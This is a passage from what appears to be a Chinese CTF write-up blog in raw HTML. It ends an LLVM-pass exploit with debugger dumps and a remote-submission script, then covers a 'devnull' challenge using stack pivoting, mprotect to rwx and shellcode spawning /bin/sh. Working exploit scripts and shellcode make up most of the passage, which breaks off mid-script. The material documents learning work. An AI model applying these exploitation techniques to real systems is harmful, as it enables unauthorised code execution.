class="hljs-number">1</span>);<br>n55(<span class="hljs-number">1</span>);<br>n56(<span class="hljs-number">1</span>);<br>n57(<span class="hljs-number">1</span>);<br>n58(<span class="hljs-number">1</span>);<br>n59(<span class="hljs-number">1</span>);<br>n60(<span class="hljs-number">1</span>);<br>n61(<span class="hljs-number">1</span>);<br>n62(<span class="hljs-number">1</span>);<br>n63(<span class="hljs-number">1</span>);<br>n64(<span class="hljs-number">1</span>);<br>n65(<span class="hljs-number">1</span>);<br>n66(<span class="hljs-number">1</span>);<br>n67(<span class="hljs-number">1</span>);<br>n68(<span class="hljs-number">1</span>);<br>n69(<span class="hljs-number">1</span>);<br>n70(<span class="hljs-number">1</span>);<br>n71(<span class="hljs-number">1</span>);<br>n72(<span class="hljs-number">1</span>);<br>n73(<span class="hljs-number">1</span>);<br>n74(<span class="hljs-number">1</span>);<br>n75(<span class="hljs-number">1</span>);<br>n76(<span class="hljs-number">1</span>);<br>n77(<span class="hljs-number">1</span>);<br>n78(<span class="hljs-number">1</span>);<br>n79(<span class="hljs-number">1</span>);<br>n80(<span class="hljs-number">1</span>);<br>n81(<span class="hljs-number">1</span>);<br>n82(<span class="hljs-number">1</span>);<br>n83(<span class="hljs-number">1</span>);<br>n84(<span class="hljs-number">1</span>);<br>n85(<span class="hljs-number">1</span>);<br>n86(<span class="hljs-number">1</span>);<br>n87(<span class="hljs-number">1</span>);<br>n88(<span class="hljs-number">1</span>);<br>n89(<span class="hljs-number">1</span>);<br>n90(<span class="hljs-number">1</span>);<br>n91(<span class="hljs-number">1</span>);<br>n92(<span class="hljs-number">1</span>);<br>n93(<span class="hljs-number">1</span>);<br>n94(<span class="hljs-number">1</span>);<br>n95(<span class="hljs-number">1</span>);<br>n96(<span class="hljs-number">1</span>);<br>n97(<span class="hljs-number">1</span>);<br>n98(<span class="hljs-number">1</span>);<br>n99(<span class="hljs-number">1</span>);<br>n100(<span class="hljs-number">1</span>);<br>n101(<span class="hljs-number">1</span>);<br>n102(<span class="hljs-number">1</span>);<br>n103(<span class="hljs-number">1</span>);<br>n104(<span class="hljs-number">1</span>);<br>n105(<span class="hljs-number">1</span>);<br>n106(<span class="hljs-number">1</span>);<br>n107(<span class="hljs-number">1</span>);<br>n108(<span class="hljs-number">1</span>);<br>n109(<span class="hljs-number">1</span>);<br>n110(<span class="hljs-number">1</span>);<br>n111(<span class="hljs-number">1</span>);<br>n112(<span class="hljs-number">1</span>);<br>n113(<span class="hljs-number">1</span>);<br>n114(<span class="hljs-number">1</span>);<br>n115(<span class="hljs-number">1</span>);<br>n116(<span class="hljs-number">1</span>);<br>n117(<span class="hljs-number">1</span>);<br>n118(<span class="hljs-number">1</span>);<br>n119(<span class="hljs-number">1</span>);<br>n120(<span class="hljs-number">1</span>);<br>n121(<span class="hljs-number">1</span>);<br>n122(<span class="hljs-number">1</span>);<br>n123(<span class="hljs-number">1</span>);<br>n124(<span class="hljs-number">1</span>);<br>n125(<span class="hljs-number">1</span>);<br>n126(<span class="hljs-number">1</span>);<br>n127(<span class="hljs-number">1</span>);<br>n128(<span class="hljs-number">1</span>);<br>n129(<span class="hljs-number">1</span>);<br>n130(<span class="hljs-number">1</span>);<br>n131(<span class="hljs-number">1</span>);<br>n132(<span class="hljs-number">1</span>);<br>n133(<span class="hljs-number">1</span>);<br>n134(<span class="hljs-number">1</span>);<br>n135(<span class="hljs-number">1</span>);<br>n136(<span class="hljs-number">1</span>);<br>n137(<span class="hljs-number">1</span>);<br>n138(<span class="hljs-number">1</span>);<br>n139(<span class="hljs-number">1</span>);<br>n140(<span class="hljs-number">1</span>);<br>n141(<span class="hljs-number">1</span>);<br>n142(<span class="hljs-number">1</span>);<br>n143(<span class="hljs-number">1</span>);<br>n144(<span class="hljs-number">1</span>);<br>n145(<span class="hljs-number">1</span>);<br>n146(<span class="hljs-number">1</span>);<br>n147(<span class="hljs-number">1</span>);<br>n148(<span class="hljs-number">1</span>);<br>n149(<span class="hljs-number">1</span>);<br>n150(<span class="hljs-number">1</span>);<br>n151(<span class="hljs-number">1</span>);<br>n152(<span class="hljs-number">1</span>);<br>n153(<span class="hljs-number">1</span>);<br>n154(<span class="hljs-number">1</span>);<br>n155(<span class="hljs-number">1</span>);<br>n156(<span class="hljs-number">1</span>);<br>n157(<span class="hljs-number">1</span>);<br>n158(<span class="hljs-number">1</span>);<br>n159(<span class="hljs-number">1</span>);<br>n160(<span class="hljs-number">1</span>);<br>n161(<span class="hljs-number">1</span>);<br>n162(<span class="hljs-number">1</span>);<br>n163(<span class="hljs-number">1</span>);<br>n164(<span class="hljs-number">1</span>);<br>n165(<span class="hljs-number">1</span>);<br>n166(<span class="hljs-number">1</span>);<br>n167(<span class="hljs-number">1</span>);<br>n168(<span class="hljs-number">1</span>);<br>n169(<span class="hljs-number">1</span>);<br>n170(<span class="hljs-number">1</span>);<br>n171(<span class="hljs-number">1</span>);<br>n172(<span class="hljs-number">1</span>);<br>n173(<span class="hljs-number">1</span>);<br>n174(<span class="hljs-number">1</span>);<br>n175(<span class="hljs-number">1</span>);<br>n176(<span class="hljs-number">1</span>);<br>n177(<span class="hljs-number">1</span>);<br>n178(<span class="hljs-number">1</span>);<br>n179(<span class="hljs-number">1</span>);<br>n180(<span class="hljs-number">1</span>);<br>n181(<span class="hljs-number">1</span>);<br>n182(<span class="hljs-number">1</span>);<br>n183(<span class="hljs-number">1</span>);<br>n184(<span class="hljs-number">1</span>);<br>n185(<span class="hljs-number">1</span>);<br>n186(<span class="hljs-number">1</span>);<br>n187(<span class="hljs-number">1</span>);<br>n188(<span class="hljs-number">1</span>);<br>n189(<span class="hljs-number">1</span>);<br>n190(<span class="hljs-number">1</span>);<br>n191(<span class="hljs-number">1</span>);<br>n192(<span class="hljs-number">1</span>);<br>n193(<span class="hljs-number">1</span>);<br>n194(<span class="hljs-number">1</span>);<br>n195(<span class="hljs-number">1</span>);<br>n196(<span class="hljs-number">1</span>);<br>n197(<span class="hljs-number">1</span>);<br>n198(<span class="hljs-number">1</span>);<br>n199(<span class="hljs-number">1</span>);<br>n200(<span class="hljs-number">1</span>);<br>n201(<span class="hljs-number">1</span>);<br>n202(<span class="hljs-number">1</span>);<br>n203(<span class="hljs-number">1</span>);<br>n204(<span class="hljs-number">1</span>);<br>n205(<span class="hljs-number">1</span>);<br>n206(<span class="hljs-number">1</span>);<br>n207(<span class="hljs-number">1</span>);<br>n208(<span class="hljs-number">1</span>);<br>n209(<span class="hljs-number">1</span>);<br>n210(<span class="hljs-number">1</span>);<br>n211(<span class="hljs-number">1</span>);<br>n212(<span class="hljs-number">1</span>);<br>n213(<span class="hljs-number">1</span>);<br>n214(<span class="hljs-number">1</span>);<br>n215(<span class="hljs-number">1</span>);<br>n216(<span class="hljs-number">1</span>);<br>n217(<span class="hljs-number">1</span>);<br>n218(<span class="hljs-number">1</span>);<br>n219(<span class="hljs-number">1</span>);<br>n220(<span class="hljs-number">1</span>);<br>n221(<span class="hljs-number">1</span>);<br>n222(<span class="hljs-number">1</span>);<br>n223(<span class="hljs-number">1</span>);<br>n224(<span class="hljs-number">1</span>);<br>n225(<span class="hljs-number">1</span>);<br>n226(<span class="hljs-number">1</span>);<br>n227(<span class="hljs-number">1</span>);<br>n228(<span class="hljs-number">1</span>);<br>n229(<span class="hljs-number">1</span>);<br>n230(<span class="hljs-number">1</span>);<br>n231(<span class="hljs-number">1</span>);<br>n232(<span class="hljs-number">1</span>);<br>n233(<span class="hljs-number">1</span>);<br>n234(<span class="hljs-number">1</span>);<br>n235(<span class="hljs-number">1</span>);<br>n236(<span class="hljs-number">1</span>);<br>n237(<span class="hljs-number">1</span>);<br>n238(<span class="hljs-number">1</span>);<br>n239(<span class="hljs-number">1</span>);<br>n240(<span class="hljs-number">1</span>);<br>n241(<span class="hljs-number">1</span>);<br>n242(<span class="hljs-number">1</span>);<br>n243(<span class="hljs-number">1</span>);<br>n244(<span class="hljs-number">1</span>);<br>n245(<span class="hljs-number">1</span>);<br>n246(<span class="hljs-number">1</span>);<br>n247(<span class="hljs-number">1</span>);<br>n248(<span class="hljs-number">1</span>);<br>n249(<span class="hljs-number">1</span>);<br>n250(<span class="hljs-number">1</span>);<br>n251(<span class="hljs-number">1</span>);<br>n252(<span class="hljs-number">1</span>);<br>n253(<span class="hljs-number">1</span>);<br>n254(<span class="hljs-number">1</span>);<br>n255(<span class="hljs-number">1</span>);<br>n256(<span class="hljs-number">1</span>);<br>n257(<span class="hljs-number">1</span>);<br>n258(<span class="hljs-number">1</span>);<br>n259(<span class="hljs-number">1</span>);<br>n260(<span class="hljs-number">1</span>);<br>n261(<span class="hljs-number">1</span>);<br>n262(<span class="hljs-number">1</span>);<br>n263(<span class="hljs-number">1</span>);<br>n264(<span class="hljs-number">1</span>);<br>n265(<span class="hljs-number">1</span>);<br>n266(<span class="hljs-number">1</span>);<br>n267(<span class="hljs-number">1</span>);<br>n268(<span class="hljs-number">1</span>);<br>n269(<span class="hljs-number">1</span>);<br>n270(<span class="hljs-number">1</span>);<br>n271(<span class="hljs-number">1</span>);<br>n272(<span class="hljs-number">1</span>);<br>n273(<span class="hljs-number">1</span>);<br>n274(<span class="hljs-number">1</span>);<br>n275(<span class="hljs-number">1</span>);<br>n276(<span class="hljs-number">1</span>);<br>n277(<span class="hljs-number">1</span>);<br>n278(<span class="hljs-number">1</span>);<br>n279(<span class="hljs-number">1</span>);<br>n280(<span class="hljs-number">1</span>);<br>n281(<span class="hljs-number">1</span>);<br>n282(<span class="hljs-number">1</span>);<br>n283(<span class="hljs-number">1</span>);<br>n284(<span class="hljs-number">1</span>);<br>n285(<span class="hljs-number">1</span>);<br>n286(<span class="hljs-number">1</span>);<br>n287(<span class="hljs-number">1</span>);<br>n288(<span class="hljs-number">1</span>);<br>n289(<span class="hljs-number">1</span>);<br>n290(<span class="hljs-number">1</span>);<br>n291(<span class="hljs-number">1</span>);<br>n292(<span class="hljs-number">1</span>);<br>n293(<span class="hljs-number">1</span>);<br>n294(<span class="hljs-number">1</span>);<br>n295(<span class="hljs-number">1</span>);<br>n296(<span class="hljs-number">1</span>);<br>n297(<span class="hljs-number">1</span>);<br>n298(<span class="hljs-number">1</span>);<br>n299(<span class="hljs-number">1</span>);<br>n300(<span class="hljs-number">1</span>);<br>n301(<span class="hljs-number">1</span>);<br>n302(<span class="hljs-number">1</span>);<br>n303(<span class="hljs-number">1</span>);<br>n304(<span class="hljs-number">1</span>);<br>n305(<span class="hljs-number">1</span>);<br>n306(<span class="hljs-number">1</span>);<br>n307(<span class="hljs-number">0x29</span>);<br>n308(<span class="hljs-number">0x22</span>);<br>n309(<span class="hljs-number">0x41</span>);<br>n310(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// opt-8           0x412229 jae    0x412293 /* &#x27;sh&#x27; */</span><br><span class="hljs-comment">// opt-8           0x42c7df jae    0x42c849 /* &#x27;shift_div&#x27; */</span><br><span class="hljs-comment">// opt-8           0x42cbd7 jae    0x42cc41 /* &#x27;sh_nonemptyEv&#x27; */</span><br><span class="hljs-comment">// opt-8           0x432faa jae    0x433014 /* &#x27;shifted_simple_hull_from_set_list&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4330aa jae    0x433114 /* &#x27;shifted_simple_hull_from_map_list&#x27; */</span><br><span class="hljs-comment">// opt-8           0x434c56 jae    0x434cc0 /* &#x27;sh_table_init&#x27; */</span><br><span class="hljs-comment">// opt-8           0x434dc9 jae    0x434e33 /* &#x27;shift&#x27; */</span><br><span class="hljs-comment">// opt-8           0x434de6 jae    0x434e50 /* &#x27;shift&#x27; */</span><br><span class="hljs-comment">// opt-8           0x434e03 jae    0x434e6d /* &#x27;shift&#x27; */</span><br><span class="hljs-comment">// opt-8           0x437414 jae    0x43747e /* &#x27;sh_bits&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4375a5 jae    0x43760f /* &#x27;shift_point_loops&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4375cc jae    0x437636 /* &#x27;shift_point_loops&#x27; */</span><br><span class="hljs-comment">// opt-8           0x43791b jae    0x437985 /* &#x27;sh_tokens&#x27; */</span><br><span class="hljs-comment">// opt-8           0x43963f jae    0x4396a9 /* &#x27;sh_basis&#x27; */</span><br><span class="hljs-comment">// opt-8           0x43bab0 jae    0x43bb1a /* &#x27;shared_ancestor&#x27; */</span><br><span class="hljs-comment">// opt-8           0x43c7be jae    0x43c828 /* &#x27;shift_var&#x27; */</span><br><span class="hljs-comment">// opt-8           0x43c81e jae    0x43c888 /* &#x27;sh_var&#x27; */</span><br><span class="hljs-comment">// opt-8           0x43c88b jae    0x43c8f5 /* &#x27;sh_table_clear&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4413d4 jae    0x44143e /* &#x27;sh_token&#x27; */</span><br><span class="hljs-comment">// opt-8           0x441c6e jae    0x441cd8 /* &#x27;sh_mem&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4429c0 jae    0x442a2a /* &#x27;shared_ptrIN5polly12RejectReasonEELb0EE4growEm&#x27; */</span><br><span class="hljs-comment">// opt-8           0x443216 jae    0x443280 /* &#x27;sholdEm&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4435b1 jae    0x44361b /* &#x27;shifted_simple_hull&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4435cf jae    0x443639 /* &#x27;shifted_simple_hull&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4435f3 jae    0x44365d /* &#x27;shifted_simple_hull&#x27; */</span><br><span class="hljs-comment">// opt-8           0x443617 jae    0x443681 /* &#x27;shifted_simple_hull&#x27; */</span><br><span class="hljs-comment">// opt-8           0x443641 jae    0x4436ab /* &#x27;shifted_simple_hull&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4452b5 jae    0x44531f /* &#x27;sh_callback&#x27; */</span><br><span class="hljs-comment">// opt-8           0x445c12 jae    0x445c7c /* &#x27;shTableEj&#x27; */</span><br><span class="hljs-comment">// opt-8           0x44636c jae    0x4463d6 /* &#x27;shiftDimEN3isl12noexceptions9union_setEii&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4463a0 jae    0x44640a /* &#x27;shiftDimEN3isl12noexceptions3setEii&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4463ce jae    0x446438 /* &#x27;shiftDimEN3isl12noexceptions9union_mapENS1_3dimEii&#x27; */</span><br><span class="hljs-comment">// opt-8           0x44640b jae    0x446475 /* &#x27;shiftDimEN3isl12noexceptions3mapENS1_3dimEii&#x27; */</span><br><span class="hljs-comment">// opt-8           0x44696b jae    0x4469d5 /* &#x27;sh&#x27; */</span><br><span class="hljs-comment">// opt-8           0x446972 jae    0x4469dc /* &#x27;sh&#x27; */</span><br><span class="hljs-comment">// opt-8           0x446984 jae    0x4469ee /* &#x27;sh&#x27; */</span><br><span class="hljs-comment">// opt-8           0x44699b jae    0x446a05 /* &#x27;sh&#x27; */</span><br><span class="hljs-comment">// opt-8           0x4469ac jae    0x446a16 /* &#x27;sh&#x27; */</span><br><br><br>n311(<span class="hljs-number">1</span>);<br>n312(<span class="hljs-number">1</span>);<br>n313(<span class="hljs-number">1</span>);<br>n314(<span class="hljs-number">0xda</span>);<br>n315(<span class="hljs-number">0xdf</span>);<br>n316(<span class="hljs-number">0x77</span>);<br>n317(<span class="hljs-number">0</span>);<br>n318(<span class="hljs-number">1</span>);<br><br><br><span class="hljs-comment">// n327(1); // -2</span><br><span class="hljs-comment">// n328(1); // -1</span><br><span class="hljs-comment">// n307(1); // cmd</span><br>n316(<span class="hljs-number">1</span>); <span class="hljs-comment">// stdout@got + 2 0x77dfda</span><br>n315(<span class="hljs-number">1</span>); <br>n314(<span class="hljs-number">1</span>); <br>n307(<span class="hljs-number">1</span>); <br>n308(<span class="hljs-number">1</span>); <br>n309(<span class="hljs-number">1</span>); <br>n310(<span class="hljs-number">1</span>); <br><br>fight(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// n264(1); // -1</span><br><span class="hljs-comment">// n328(1); // -1</span><br><span class="hljs-comment">// fight(-2);</span><br><span class="hljs-comment">// fight(-3);</span><br><span class="hljs-comment">// fight(-4);</span><br><span class="hljs-comment">// fight(-5);</span><br><span class="hljs-comment">// fight(-6);</span><br><br><span class="hljs-comment">// merge(-1,0);</span><br><span class="hljs-comment">// merge(-1,-2);</span><br><span class="hljs-comment">// merge(-1,-3);</span><br><span class="hljs-comment">// merge(2,3);</span><br>&#125;<br><span class="hljs-comment">// 0x412229</span><br><span class="hljs-comment">// 0x7ffff4e20750 0x7ffff3b63880 0x7ffff3b641d7</span><br><span class="hljs-comment">// 0x7ffff3b57000 0x6668936d277b6892 0x7ffff3b639e6 0x7ffff3b63af6 0x7ffff3b64278 0x7ffff3b641c5</span><br><span class="hljs-comment">/* 0xD2780x7ffff3b641c5</span><br><span class="hljs-comment"> â–º 0x7ffff4e2077e &lt;llvm::FPPassManager::runOnModule(llvm::Module&amp;)+46&gt;    call   llvm::FPPassManager::runOnFunction(llvm::Function&amp;)                &lt;llvm::FPPassManager::runOnFunction(llvm::Function&amp;)&gt;</span><br><span class="hljs-comment"> 0x4bb7e3 &lt;main+11507&gt;    call   llvm::legacy::PassManager::run(llvm::Module&amp;)@plt  </span><br><span class="hljs-comment"> â–º 0x7ffff4e20b48 &lt;llvm::legacy::PassManagerImpl::run(llvm::Module&amp;)+744&gt;    call   qword ptr [rax + 0x88]        &lt;llvm::FPPassManager::runOnModule(llvm::Module&amp;)&gt;</span><br><span class="hljs-comment">x/50xg 0x7ffff3d6d978</span><br><span class="hljs-comment">0x7ffff3d6d9a8 &lt;cmd&gt;:0x0000000000824d000x0000000000822fb0</span><br><span class="hljs-comment">0x7ffff3d6d9b8:0x00000000000000000x6868686868d06868</span><br><span class="hljs-comment">0x7ffff3d6d9c8 &lt;weaponlist+8&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6d9d8 &lt;weaponlist+24&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6d9e8 &lt;weaponlist+40&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6d9f8 &lt;weaponlist+56&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da08 &lt;weaponlist+72&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da18 &lt;weaponlist+88&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da28 &lt;weaponlist+104&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da38 &lt;weaponlist+120&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da48 &lt;weaponlist+136&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da58 &lt;weaponlist+152&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da68 &lt;weaponlist+168&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da78 &lt;weaponlist+184&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment">0x7ffff3d6da88 &lt;weaponlist+200&gt;:0x68686868686868680x6868686868686868</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> </span><br><span class="hljs-comment">wea 2169C0  2169A8</span><br><span class="hljs-comment"> </span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h4 id="exp-py"><a class="header-anchor" href="#exp-py">Â¶</a><a href="http://exp.py">exp.py</a></h4><p>ç”¨æ¥æ”»å‡»è¿œç¨‹çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python exp.py 123.56.105.22 35252</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(sys.argv[<span class="hljs-number">1</span>], sys.argv[<span class="hljs-number">2</span>])<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./exp.ll&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)<br><br>payload=f.read()<br><br>f.close()<br><br>payload2 = payload.encode(<span class="hljs-string">&quot;base64&quot;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;give&quot;</span>, payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="devnull"><a class="header-anchor" href="#devnull">Â¶</a>devnull</h3><h4 id="åˆ†æ-v3"><a class="header-anchor" href="#åˆ†æ-v3">Â¶</a>åˆ†æ</h4><p>å­˜åœ¨æ ˆæº¢å‡ºï¼Œå¯ä»¥è¦†ç›–æ‰ fd çš„åŒæ—¶è¦†ç›–æ‰ rbp å’Œ ripï¼Œè€ƒè™‘æ ˆè¿ç§»ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731133726905.png" alt="devnull1"></p><p>çœ‹åˆ°æ§åˆ¶æ‰§è¡Œæµæ—¶ rdx ä¸º 7ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731133853102.png" alt="devnull2"></p><p>æ¯”è¾ƒçªå…€çš„ strlen ä¸­ï¼Œæœ‰æ§åˆ¶ rax çš„ gadgetã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731133935959.png" alt="devnull3"></p><p>é…åˆ mprotect å¯ä»¥æ‰¬æˆ rwx æƒé™ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731134022615.png" alt="devnull4"></p><p>è¯»å…¥ç¬¬ä¸€æ®µ shellcode æ‰©å¤§è¾“å…¥å­—èŠ‚æ•°ï¼Œç„¶åç›´æ¥è°ƒ <a href="http://shellcraft.sh">shellcraft.sh</a>() å³å¯ï¼Œæ³¨æ„çš„æ˜¯è¾“å‡ºæµè¢«å…³é—­äº†ï¼Œæ‰§è¡Œ <code>exec 1&gt;&amp;0</code> æ¢å¤å°±è¡Œã€‚</p><h4 id="Exp-v2"><a class="header-anchor" href="#Exp-v2">Â¶</a>Exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/pwn/source/glibc-2.35/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdbscript += <span class="hljs-string">&#x27;b fprintf&#x27;</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./devnull&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./devnull&#x27;)</span><br><span class="hljs-comment"># debug(0x4014E3)</span><br>p = remote(<span class="hljs-string">&#x27;47.94.166.51&#x27;</span>,<span class="hljs-number">33797</span>)<br>addr = <span class="hljs-number">0x3fe000</span> + <span class="hljs-number">0x500</span><br>leave_ret = <span class="hljs-number">0x401511</span><br>rax_leave_ret = <span class="hljs-number">0x401350</span> <span class="hljs-comment"># mov rax, [rbp+s];leave;ret;</span><br>len_rax_mprotect = <span class="hljs-number">0x4012D0</span> <span class="hljs-comment"># len = 0x1000 addr = rax mprotect</span><br><span class="hljs-comment"># sea(&quot;please input your filename\n&quot;,&#x27;/bin/sh\0&#x27;.ljust(0x20,&#x27;\0&#x27;)+&#x27;\x00&#x27;+&#x27;\0&#x27;*0x13+p64(0x404010))</span><br>sea(<span class="hljs-string">&quot;please input your filename\n&quot;</span>,<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>.ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\0&#x27;</span>*(<span class="hljs-number">0x1c</span>-<span class="hljs-number">8</span>)+p64(addr)+p64(addr+<span class="hljs-number">0x18</span>)+p64(rax_leave_ret))<br>shellcode = asm(<br>  <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  push 0</span><br><span class="hljs-string">  pop rax</span><br><span class="hljs-string">  xchg rdi,rsi</span><br><span class="hljs-string">  xchg rdi,rdx</span><br><span class="hljs-string">  push 0</span><br><span class="hljs-string">  pop rdi</span><br><span class="hljs-string">  syscall</span><br><span class="hljs-string">  &#x27;&#x27;&#x27;</span><br>)<br>payload = p64(<span class="hljs-number">0x3fe000</span>) <span class="hljs-comment"># rax</span><br>payload = payload.ljust(<span class="hljs-number">0x20</span>,<span 